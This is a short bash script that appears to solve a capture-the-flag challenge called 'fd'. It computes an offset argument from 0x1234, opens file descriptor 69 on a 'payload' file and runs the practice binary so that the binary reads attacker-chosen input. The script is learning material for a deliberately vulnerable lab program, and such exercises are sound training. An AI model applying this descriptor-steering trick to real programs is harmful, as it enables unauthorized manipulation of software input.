#!/bin/bash

# echo $$

TARGET_FD=69

# ARG=$(($((0x1234)) - $TARGET_FD))
ARG=`echo "$((0x1234)) + ${TARGET_FD}" | bc`

exec 69<>payload

./fd ${ARG}

exec 69>&-
